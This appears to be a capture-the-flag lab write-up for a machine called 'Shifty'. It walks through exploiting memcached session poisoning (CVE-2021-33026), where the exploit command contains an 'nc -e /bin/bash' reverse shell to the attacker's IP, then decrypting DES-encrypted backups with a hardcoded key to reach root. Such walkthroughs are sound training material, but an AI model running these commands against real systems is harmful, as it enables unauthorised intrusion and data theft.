---
icon: ubuntu
---

# Shifty - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.209.59 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-08 07:30 EDT
Nmap scan report for 192.168.209.59
Host is up (0.031s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT      STATE  SERVICE   VERSION
22/tcp    open   ssh       OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 54:d8:d1:1a:e4:8c:66:48:37:ba:89:0a:9b:aa:db:47 (RSA)
|   256 fb:75:84:86:ec:b5:00:f3:4f:cb:c8:f2:18:85:42:b7 (ECDSA)
|_  256 2f:fd:b2:b1:6c:02:e8:a0:ba:e7:f7:52:80:3f:de:a3 (ED25519)
53/tcp    closed domain
80/tcp    open   http      nginx 1.10.3
|_http-title: Gatsby + Netlify CMS Starter
|_http-server-header: nginx/1.10.3
|_http-generator: Gatsby 2.22.15
5000/tcp  open   http      Werkzeug httpd 1.0.1 (Python 3.5.3)
|_http-title: Hello, world!
|_http-server-header: Werkzeug/1.0.1 Python/3.5.3
11211/tcp open   memcached Memcached 1.4.33 (uptime 175 seconds)
Aggressive OS guesses: Linux 3.10 - 4.11 (96%), Linux 3.13 - 4.4 (96%), Linux 3.2 - 4.14 (94%), Linux 2.6.32 - 3.13 (93%), Linux 3.8 - 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.13 or 4.2 (90%), Linux 4.4 (90%), Synology DiskStation Manager 7.1 (Linux 4.4) (90%), Linux 2.6.32 - 3.10 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   32.70 ms 192.168.45.1
2   32.67 ms 192.168.45.254
3   32.75 ms 192.168.251.1
4   32.90 ms 192.168.209.59
```

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (376).png" alt=""><figcaption></figcaption></figure>

I did some directory busting and nothing interesting came back. This seems to be a static page

### <mark style="color:$primary;">HTTP Port 5000 TCP</mark>

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

We are given login credentials! As exciting as that is logging in as admin:admin does not provide any additional functionality

<figure><img src="../../.gitbook/assets/image (378).png" alt=""><figcaption></figcaption></figure>

However logging in did assigns us a token

<figure><img src="../../.gitbook/assets/image (379).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">HTTP Port 11211 Memcached 1.4.33</mark>

I am going to dump it using `memcdump`

```
memcdump --servers=192.168.209.59
```

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

The last cookie in the dump matches our cookie! I am going to try and modify my cookie and see if it gets stored here.

<figure><img src="../../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>

This cookie gets stored in Memcached there is no cookie sanitation

Searching for memcached poisoning I came across this [**repo**](https://github.com/CarlosG13/CVE-2021-33026)

<figure><img src="../../.gitbook/assets/image (384).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Memcached Poisoning</mark>

```bash
git clone https://github.com/CarlosG13/CVE-2021-33026.gi
```

Before I run the exploit, I am going to revert the machine&#x20;

Make sure you capture the request again with your new cookie

<figure><img src="../../.gitbook/assets/image (2548).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash
python3 cve-2021-33026_PoC.py --rhost '192.168.209.59' --rport '5000' --cmd 'nc -e /bin/bash 192.168.45.158 80' --cookie 'session:session=faff206e-22dd-4693-a63d-517eb7eee4aa'
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (2549).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (2550).png" alt=""><figcaption></figcaption></figure>

I found a `backup.py` file in `/opt/backups`containing a hardcoded key

```python
import sys
import os
import hashlib
from des import des, CBC, PAD_PKCS5

def backup(name, file):
    dest_dir = os.path.dirname(os.path.realpath(__file__)) + '/data'
    dest_name = hashlib.sha224(name.encode('utf-8')).hexdigest()
    with open('{}/{}'.format(dest_dir, dest_name), 'wb') as dest:
        data = file.read()
        k = des(b"87629ae8", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)
        cipertext = k.encrypt(data)
        dest.write(cipertext)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print('Usage: {} <file>'.format(sys.argv[0]))
    
    FILENAME = sys.argv[1]
    FILENAME = os.path.abspath(FILENAME)
    print('Backing up "{}"'.format(FILENAME))
    f = None
    try:
        f = open(FILENAME, 'rb')
        backup(FILENAME, f)
    except Exception as e:
        print('Could not open {}'.format(FILENAME))
        print(e)
    finally:
        if f:
            f.close()
```

In the data directory there are some encrypted files

<figure><img src="../../.gitbook/assets/image (2551).png" alt=""><figcaption></figcaption></figure>

Using the hardcoded the key, I can decrypt the encrypted files stored in `/opt/backups/data` . I'll use the following python script for decryption

```python
from pyDes import des, CBC, PAD_PKCS5
import sys

# Setup cipher
k = des(b"87629ae8", CBC, b"\0\0\0\0\0\0\0\0", pad=None, padmode=PAD_PKCS5)

# Use the filename passed as the first argument
with open(sys.argv[1], 'rb') as f:
    data = f.read()
    decrypted = k.decrypt(data)
    print(decrypted.decode(errors="replace"))
```

<figure><img src="../../.gitbook/assets/image (2552).png" alt=""><figcaption></figcaption></figure>

it worked also, to transfer files I used nc

<figure><img src="../../.gitbook/assets/image (2555).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (2554).png" alt=""><figcaption></figcaption></figure>

Using the ssh key I just found eariler, I was able to login as root via ssh

<figure><img src="../../.gitbook/assets/image (2556).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Another way to decrypt</mark>

{% code overflow="wrap" %}
```bash
for FILE in *; do openssl enc -d -des-cbc -K 3837363239616538 -iv "0000000000000000" -in $FILE -out decrypt$FILE; rm $FILE; done
```
{% endcode %}

Once all the files are decrypted just run cat \* to see them all

<figure><img src="../../.gitbook/assets/image (2557).png" alt=""><figcaption></figcaption></figure>
